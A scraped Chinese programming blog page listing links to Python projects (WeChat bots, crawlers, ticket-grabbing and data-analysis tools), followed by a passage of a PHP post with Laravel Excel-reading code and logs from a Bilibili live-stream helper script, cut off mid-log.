<p><a href="https://github.com/wut0n9/Wechat_Stat" target="_blank" rel="noopener">统计微信朋友圈送出的赞票与得到的赞票人员比例</a></p>
<p><a href="https://github.com/TransparentLC/WechatMomentScreenshot" target="_blank" rel="noopener">朋友圈转发截图生成工具</a></p>
<p><a href="https://github.com/YanwenTao123/wechat" target="_blank" rel="noopener">爬取微信朋友圈和自己的动态,采用appiunm进行爬取</a></p>
<p><a href="https://github.com/xiefeisd/wecraw" target="_blank" rel="noopener">爬取微信朋友圈</a></p>
<p><a href="https://github.com/tangtaorong86/66bossRobot" target="_blank" rel="noopener">自动为朋友圈点赞/踩</a></p>
<p><a href="https://sika0819.top/2019/01/08/Python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%96%97%E5%9B%BE/" target="_blank" rel="noopener">Python实现微信公众号机器人斗图</a></p>
<p><a href="https://github.com/wistbean/learn_python3_spider" target="_blank" rel="noopener">python3爬虫相关示例汇总</a></p>
<p><a href="https://www.cnblogs.com/sirkevin/p/5770681.html" target="_blank" rel="noopener">Python进行数据分析 基础系列随笔汇总</a></p>
<p><a href="https://morvanzhou.github.io/tutorials/data-manipulation/np-pd/2-2-np-array/" target="_blank" rel="noopener">Numpy 的创建 array 含b站视频</a></p>
<p><a href="https://github.com/Light-City/weixinAnalysis/blob/master/analysis.py" target="_blank" rel="noopener">微信好友分析</a></p>
<p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">爬虫框架之pyspider</a></p>
<p><a href="https://github.com/python-fan/pdf2word" target="_blank" rel="noopener">多线程PDF转Word</a></p>
<p><a href="http://www.xetlab.com/2019/03/14/35%E5%B2%81%E7%A0%81%E5%86%9C%E7%9A%84%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF-python%E7%AF%87/" target="_blank" rel="noopener">机器学习入门之路-python篇</a></p>
<p><a href="http://www.xetlab.com/2019/03/13/%E7%94%A8python%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E9%A2%84%E8%AD%A6%E6%9C%BA%E5%99%A8%E4%BA%BA%EF%BC%88%E6%94%AF%E6%8C%81%E5%BE%AE%E4%BF%A1%E5%92%8C%E9%92%89%E9%92%89%EF%BC%89/" target="_blank" rel="noopener">python写一个预警机器人支持微信和钉钉</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMzgyOTg1MQ==&amp;mid=2247484844&amp;idx=1&amp;sn=a10834a90625e04eeb9ad3179c1ad157&amp;chksm=97b19418a0c61d0e6f61268396649898f75a87967c68b6f3ec6b1f53629a604588c85c8517e0&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">如何自学 Python</a></p>
<p><a href="https://github.com/Snailclimb/Python" target="_blank" rel="noopener">Python学习第三方库案例总结</a></p>
<p><a href="https://github.com/shengqiangzhang/examples-of-web-crawlers" target="_blank" rel="noopener">淘宝模拟登录,淘宝商品爬虫</a></p>
<p><a href="https://inspurer.github.io/2018/12/01/Python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E8%87%AA%E5%8A%A8%E5%9B%9E%E5%A4%8D%E5%92%8C%E7%BE%A4%E8%81%8A%E5%8A%A9%E6%89%8B/" target="_blank" rel="noopener">Python 实现微信自动回复和群聊助手</a></p>
<p><a href="https://sika0819.top/2019/01/08/Python%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%96%97%E5%9B%BE/" target="_blank" rel="noopener">Python实现微信机器人斗图</a></p>
<p><a href="http://www.uml.org.cn/python/201904013.asp" target="_blank" rel="noopener">使用Python对微信好友进行数据分析</a></p>
<p><a href="https://echarts.baidu.com/echarts2/doc/example/pie1.html" target="_blank" rel="noopener">echarts demo</a></p>
<p><a href="https://github.com/houtianze/bypy" target="_blank" rel="noopener">百度云/百度网盘Python客户端</a></p>
<p><a href="https://www.playpi.org/2019020701.html" target="_blank" rel="noopener">初识 ItChat</a></p>
<p><a href="https://www.makcyun.top/Python_learning04.html" target="_blank" rel="noopener">Python 一键制作微信好友图片墙</a></p>
<p><a href="https://github.com/facert/zufang" target="_blank" rel="noopener">微信找房机器人</a></p>
<p><a href="https://www.yuque.com/lexiansheng/sectech/mabe06" target="_blank" rel="noopener">Python 微信机器人</a></p>
<p><a href="https://www.ershicimi.com/a/6273" target="_blank" rel="noopener">猪哥的Python入门教程</a></p>
<p><a href="https://github.com/pig6/wxrobot" target="_blank" rel="noopener">基于python的微信机器人</a></p>
<p><a href="https://blog.chatie.io/talk-about-wechat-robot/" target="_blank" rel="noopener">微信机器人方向的探索</a></p>
<p><a href="https://github.com/lb2281075105/Python-WeChat-ItChat" target="_blank" rel="noopener">微信机器人</a></p>
<p><a href="https://learnku.com/articles/27893#topnav" target="_blank" rel="noopener">开源海报生成器</a></p>
<p> <a href="http://www.zhuanzhi.ai/" target="_blank" rel="noopener">为人工智能从业者服务</a></p>
<p><a href="https://github.com/efonfighting/gzh-downloads" target="_blank" rel="noopener">公众号文章下载为PDF</a></p>
<p><a href="https://www.ctolib.com/geekeren-iWechat.html" target="_blank" rel="noopener">iWechat微信机器人实现了wxpy的Docker化</a></p>
<p><a href="https://yfzhou.coding.me/2018/09/06/Python%E9%AA%9A%E6%93%8D%E4%BD%9C-%E8%BF%98%E5%8E%9F%E5%B7%B2%E6%92%A4%E5%9B%9E%E7%9A%84%E5%BE%AE%E4%BF%A1%E6%B6%88%E6%81%AF/" target="_blank" rel="noopener">Python骚操作 | 还原已撤回的微信消息</a></p>
<p><a href="https://www.qingwei.tech/programe-develops/python/881.html" target="_blank" rel="noopener">Python Learning Note Day </a></p>
<p><a href="https://www.cnblogs.com/zlel/p/9267629.html" target="_blank" rel="noopener">Python-OpenCV基本操作cv2</a></p>
<p><a href="https://github.com/axiref/WechatSogou" target="_blank" rel="noopener">基于搜狗微信搜索的微信公众号爬虫接口</a></p>
<p><a href="http://1987.name/1433.html" target="_blank" rel="noopener">Zabbix + Python/Bash脚本实现使用企业微信发送监控报警</a></p>
<p><a href="https://blog.chatie.io/koa-wechaty-assistant/" target="_blank" rel="noopener">使用koa2+wechaty打造个人微信小秘书</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/63079462" target="_blank" rel="noopener">创建微信机器人</a></p>
<p><a href="https://chuansongme.com/account/PythonCoder" target="_blank" rel="noopener">Python开发者</a></p>
<p><a href="https://mp.weixin.qq.com/s/WSF7UB4XnNu8Bu_GICXi0Q" target="_blank" rel="noopener"> Python 遇上你的微信好友</a></p>
<p><a href="https://github.com/coder-pig/CPWechatXposed" target="_blank" rel="noopener">Xposed Hook微信等APP</a></p>
<p><a href="https://www.jerrycoding.com/article/wechat-tool-2/" target="_blank" rel="noopener">微信消息自动回复、撤回消息监控</a></p>
<p><a href="http://www.jintiankansha.me/t/wo1bS0Bl8S" target="_blank" rel="noopener">Python查看微信共同好友</a></p>
<p><a href="https://mp.weixin.qq.com/s/nWxa5SZI9NN2aEaaSzV6XA" target="_blank" rel="noopener">Python知识圈原创文章合集</a></p>
<p><a href="https://www.pyzhishiquan.com/noodles-skrrr.html" target="_blank" rel="noopener">Python可视化分析「大碗宽面」b站弹幕和网易云音乐评论https://github.com/Brucepk/Kris-noodles</a></p>
<p><a href="https://github.com/Chion82/WeChatMomentStat" target="_blank" rel="noopener">微信朋友圈简单数据分析脚本</a></p>
<p><a href="https://github.com/wistbean/learn_python3_spider" target="_blank" rel="noopener">python3爬虫相关示例汇总</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MjAwODM4MA==&amp;mid=2650718575&amp;idx=3&amp;sn=425591808b5d11a7e4b04a0831fd3b41&amp;chksm=bea6b0bc89d139aa1b2d6c16c0144f862c41298f6ac432c115c0c2c2a2e0a8b1374e78636152&amp;scene=0&amp;xtrack=1" target="_blank" rel="noopener">5000 微信好友头像拼成一张图</a></p>
<p><a href="https://github.com/makcyun/eastmoney_spider" target="_blank" rel="noopener">爬取东方财富网上市公司的财务报表数据</a></p>
<p><a href="https://www.bilibili.com/video/av50200661/" target="_blank" rel="noopener">Python实现获取微信好友信息</a></p>
<p><a href="https://github.com/YueYongDev/ise_qr_generate" target="_blank" rel="noopener">Python制作一个实验室海报生成器</a></p>
<p><a href="https://mp.weixin.qq.com/s/mYkI4_NVOlQ3ue6O_QNZhg" target="_blank" rel="noopener">Python让你的命令行像坤坤一样会打篮球</a></p>
<p><a href="https://mp.weixin.qq.com/s/iPpRtFeafdq1rnc1ZT1aRA" target="_blank" rel="noopener">如何帮女朋友快速抢票</a></p>
<p><a href="https://juejin.im/post/5bce8201518825773605597d" target="_blank" rel="noopener">最全的网络爬虫干货总结</a></p>
<p><a href="https://github.com/imhuay/Algorithm_Interview_Notes-Chinese/blob/master/C-%E6%95%B0%E5%AD%A6/B-%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8.md" target="_blank" rel="noopener">微积分的基本直觉</a></p>
<p><a href="https://space.bilibili.com/88461692/video" target="_blank" rel="noopener">高数和线代入门教程</a></p>
<p><a href="https://www.makcyun.top/web_scraping_withpython20.html" target="_blank" rel="noopener">Python 告诉你所不知道的春晚 1983 -2018</a></p>
<p><a href="https://mp.weixin.qq.com/s/aM0JBtM_meQU_mSfSUwe6g" target="_blank" rel="noopener"> linux搭建12306刷票平台</a></p>
<p><a href="https://learnku.com/articles/22850" target="_blank" rel="noopener">PHP、Python、JavaScript 识别二维码和生成二维码解决方案</a></p>
<p><a href="https://github.com/xtyxtyx/sorry" target="_blank" rel="noopener">sorry，为所欲为</a></p>
<p><a href="https://sphard.github.io/gfw" target="_blank" rel="noopener">gfw</a></p>
<p><a href="https://mp.weixin.qq.com/s/gnrreVSQQyRsUJpGkWsxCg" target="_blank" rel="noopener">树莓派3的Python Web系统</a></p>
<p><a href="https://github.com/iDwyane/CrawlerDemo" target="_blank" rel="noopener">爬虫的Demo</a></p>
<p><a href="https://github.com/testerSunshine/12306" target="_blank" rel="noopener">12306火车票</a></p>
<p><a href="https://github.com/free-vpn/chrome" target="_blank" rel="noopener">翻墙</a></p>
<p><a href="https://github.com/v2ray/v2ray-core" target="_blank" rel="noopener">v2ray</a></p>
<p><a href="https://github.com/shadowsocksr-backup/shadowsocksr" target="_blank" rel="noopener">shadowsocksr</a></p>
<p><a href="https://github.com/shadowsocks/shadowsocks-windows" target="_blank" rel="noopener">shadowsocks-windows</a></p>
<p><a href="https://github.com/gfwlist/gfwlist" target="_blank" rel="noopener">gfwlist</a></p>
<p><a href="https://github.com/shadowsocks/shadowsocks/tree/2.9.1" target="_blank" rel="noopener">shadowsocks</a></p>
<p><a href="http://www.newbfun.com/dogmain.html" target="_blank" rel="noopener">人工智能舔狗</a></p>
<p><a href="https://github.com/ecthros/uncaptcha2" target="_blank" rel="noopener">google验证码破解</a></p>
<p><a href="https://github.com/lancopku/pkuseg-python?utm_source=gold_browser_extension" target="_blank" rel="noopener">中文分词工具</a></p>
<p><a href="https://github.com/d2l-ai/d2l-zh?utm_source=gold_browser_extension" target="_blank" rel="noopener">《动手学深度学习》</a></p>
<p><a href="https://github.com/testerSunshine/12306?utm_source=gold_browser_extension" target="_blank" rel="noopener">12306智能刷票，订票</a></p>
<p><a href="https://github.com/meolu/walle-web?utm_source=gold_browser_extension" target="_blank" rel="noopener"> 开源项目代码部署平台</a></p>
<p><a href="https://github.com/ageitgey/face_recognition?utm_source=gold_browser_extension" target="_blank" rel="noopener">人脸识别</a></p>
<p><a href="https://mp.weixin.qq.com/s/lyoadqBrOLGVugTA37MHYA" target="_blank" rel="noopener">网易云音乐可视化</a></p>
<p><a href="https://github.com/Tobby-star/music_163" target="_blank" rel="noopener">Python数据可视化：网易云音乐</a></p>
<p><a href="https://www.thiswaifudoesnotexist.net/" target="_blank" rel="noopener">AI 自动生成动漫头像的网站 </a></p>
<p><a href="https://github.com/lancopku/PKUSeg-python" target="_blank" rel="noopener">中文分词 Python 工具包</a></p>
<p><a href="https://github.com/LoadChange/amemv-crawler" target="_blank" rel="noopener">下载指定的 抖音（Douyin） 号的视频,抖音爬虫</a></p>
<p><a href="https://github.com/ashnkumar/sketch-code" target="_blank" rel="noopener">人工智能自动生成 HTML 代码，可用于生产环境 </a></p>
<p><a href="https://mp.weixin.qq.com/s/mGhgMEWfcYxS2AlF1vEOjA" target="_blank" rel="noopener">微信公众号爬虫</a></p>
<p><a href="https://github.com/kerlomz/captcha_trainer" target="_blank" rel="noopener">验证码识别</a></p>
<p><a href="https://github.com/zergtant/pytorch-handbook" target="_blank" rel="noopener">PyTorch 进行深度学习开发和研究的朋友快速入门 </a></p>
<p><a href="https://github.com/yzygithub/showImg.git" target="_blank" rel="noopener">鉴黄数据集 </a></p>
<p><a href="https://legacy.gitbook.com/book/germey/python3webspider/details" target="_blank" rel="noopener">Python3网络爬虫开发实战</a></p>
<p><a href="https://github.com/mengzxh/weixin_friend_check" target="_blank" rel="noopener">检测是否删除被微信好友删除</a></p>
<p><a href="https://mp.weixin.qq.com/s/UbPbNo-oy5Im1hpmF_Hj2g" target="_blank" rel="noopener">python微信头像</a></p>
<p><a href="https://github.com/0xR0/hediye" target="_blank" rel="noopener">Hash 生成器、离线破解工具</a></p>
<p><a href="https://github.com/versionzhang/python_12306" target="_blank" rel="noopener">Python 12306 的抢票工具 </a></p>
<p><a href="http://fanqieto.top/2018/07/10/python3%E5%85%A5%E9%97%A8%E5%AF%BC%E5%AD%A6/" target="_blank" rel="noopener">python3入门导学</a></p>
<p><a href="https://github.com/CriseLYJ/awesome-python-login-model" target="_blank" rel="noopener">python模拟登陆一些大型网站</a></p>
<p><a href="https://github.com/deepinsight/insightface" target="_blank" rel="noopener">人脸检测方案</a></p>
<p><a href="https://mp.weixin.qq.com/s/SQ_1TKxMihtiWxPqH3FoJw" target="_blank" rel="noopener">python数据之道公众号</a></p>
<p><a href="https://mp.weixin.qq.com/s/BgpGBOuqeO7KHi7otZ_Ubw" target="_blank" rel="noopener">Python爬虫登录</a></p>
<p><a href="http://www.liujiangblog.com/course/data/" target="_blank" rel="noopener">Python数据分析</a></p>
<p><a href="http://www.pythontip.com/" target="_blank" rel="noopener">Python之禅挑战</a></p>
<p><a href="https://www.restran.net/2018/05/10/tensorflow-applications/" target="_blank" rel="noopener">深度学习和 TensorFlow 的有趣应用</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/12/有用的PHP项目收集/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/12/有用的PHP项目收集/" itemprop="url">有用的PHP项目收集</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-12T14:06:33+08:00">
                2018-12-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  5.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  29 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="excel"><a href="#excel" class="headerlink" title="excel"></a>excel</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> maatwebsite/excel</span><br><span class="line"></span><br><span class="line">composer <span class="built_in">require</span> box/spout</span><br><span class="line">php artisan make:command ExcelReader</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Console\Commands;</span><br><span class="line"></span><br><span class="line">use App\Imports\TestImport;</span><br><span class="line">use Box\Spout\Common\Type;</span><br><span class="line">use Box\Spout\Reader\ReaderFactory;</span><br><span class="line">use Illuminate\Console\Command;</span><br><span class="line">use Maatwebsite\Excel\Facades\Excel;</span><br><span class="line">use PhpOffice\PhpSpreadsheet\Settings;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExcelReader</span> <span class="keyword">extends</span> <span class="title">Command</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The name and signature of the console command.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $signature = <span class="string">'excel:reader &#123;path&#125; &#123;--drive=laravel-excel&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The console command description.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $description = <span class="string">'Command description'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试文件的行数</span></span><br><span class="line"><span class="comment">     * @var int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private $rows = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 程序运行消耗的时间(s)</span></span><br><span class="line"><span class="comment">     * @var int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private $timeUsage = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 程序运行消耗的内存(byte)</span></span><br><span class="line"><span class="comment">     * @var int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private $memoryUsage = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new command instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @throws \Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path = $<span class="keyword">this</span>-&gt;argument(<span class="string">'path'</span>);</span><br><span class="line">        $option = $<span class="keyword">this</span>-&gt;option(<span class="string">'drive'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> ($option) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'laravel-excel'</span>:</span><br><span class="line">                $<span class="keyword">this</span>-&gt;useLaravelExcelDrive($path);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'spout'</span>:</span><br><span class="line">                $<span class="keyword">this</span>-&gt;useSpoutDrive($path);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">'Invalid option '</span> . $option);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;info(sprintf(<span class="string">'共读取数据：%s 行'</span>, $<span class="keyword">this</span>-&gt;rows));</span><br><span class="line">        $<span class="keyword">this</span>-&gt;info(sprintf(<span class="string">'共耗时：%s秒'</span>, $<span class="keyword">this</span>-&gt;timeUsage));</span><br><span class="line">        $<span class="keyword">this</span>-&gt;info(sprintf(<span class="string">'共消耗内存: %sM'</span>, $<span class="keyword">this</span>-&gt;memoryUsage / <span class="number">1024</span> / <span class="number">1024</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">useSpoutDrive</span>(<span class="params">$path</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ini_set(<span class="string">'memory_limit'</span>, <span class="number">-1</span>);</span><br><span class="line">        $start = now();</span><br><span class="line">        $reader = ReaderFactory::create(Type::XLSX);</span><br><span class="line">        $reader-&gt;setShouldFormatDates(<span class="literal">true</span>);</span><br><span class="line">        $reader-&gt;open(storage_path(<span class="string">'app/'</span>.$path));</span><br><span class="line">        $rows = [];</span><br><span class="line">        foreach ($reader-&gt;getSheetIterator() <span class="keyword">as</span> $sheet) &#123;</span><br><span class="line">            foreach ($sheet-&gt;getRowIterator() <span class="keyword">as</span> $row) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;rows++;</span><br><span class="line">                $rows[] = $row;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;timeUsage = now()-&gt;diffInSeconds($start);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;memoryUsage = xdebug_peak_memory_usage();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">useLaravelExcelDrive</span>(<span class="params">$path</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $start = now();</span><br><span class="line">        Settings::setLibXmlLoaderOptions(LIBXML_COMPACT | LIBXML_PARSEHUGE);</span><br><span class="line">        ini_set(<span class="string">'memory_limit'</span>, <span class="number">-1</span>);</span><br><span class="line">        $array = Excel::toArray(<span class="keyword">new</span> TestImport(), $path);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;rows = count($array[<span class="number">0</span>]);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;timeUsage = now()-&gt;diffInSeconds($start);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;memoryUsage = xdebug_peak_memory_usage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">php artisan make:<span class="keyword">import</span> TestImport</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace App\Imports;</span><br><span class="line"></span><br><span class="line">use Illuminate\Support\Collection;</span><br><span class="line">use Maatwebsite\Excel\Concerns\ToArray;</span><br><span class="line">use Maatwebsite\Excel\Concerns\ToCollection;</span><br><span class="line">use Maatwebsite\Excel\Concerns\WithChunkReading;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestImport</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">php artisan excel:read public/test.xlsx</span><br><span class="line">php artisan excel:read public/test.xlsx --drive=spout</span><br></pre></td></tr></table></figure>
<h3 id="B-站直播实用脚本"><a href="#B-站直播实用脚本" class="headerlink" title="B 站直播实用脚本"></a>B 站直播实用脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:<span class="comment">//github.com/metowolf/BilibiliHelper.git</span></span><br><span class="line">$ cd BilibiliHelper</span><br><span class="line">$ cp config.example config</span><br><span class="line">$ composer install</span><br><span class="line">$ php index.php</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.DEBUG: POST: https:<span class="comment">//api.live.bilibili.com/User/userOnlineHeart</span></span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.DEBUG: &#123;<span class="string">"code"</span>:<span class="number">0</span>,<span class="string">"msg"</span>:<span class="string">"OK"</span>,<span class="string">"message"</span>:<span class="string">"OK"</span>,<span class="string">"data"</span>:&#123;<span class="string">"giftlist"</span>:[]&#125;&#125;</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.INFO: 向直播间 <span class="number">3746256</span> 发送心跳包 (web)</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.DEBUG: POST: https:<span class="comment">//api.live.bilibili.com/mobile/userOnlineHeart</span></span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.DEBUG: &#123;<span class="string">"code"</span>:<span class="number">0</span>,<span class="string">"msg"</span>:<span class="string">"OK"</span>,<span class="string">"message"</span>:<span class="string">"OK"</span>,<span class="string">"data"</span>:&#123;<span class="string">"giftlist"</span>:[]&#125;&#125;</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">58</span>:<span class="number">33</span>] Bilibili.INFO: 向直播间 <span class="number">3746256</span> 发送心跳包 (APP)</span><br><span class="line">[<span class="number">2018</span><span class="number">-12</span><span 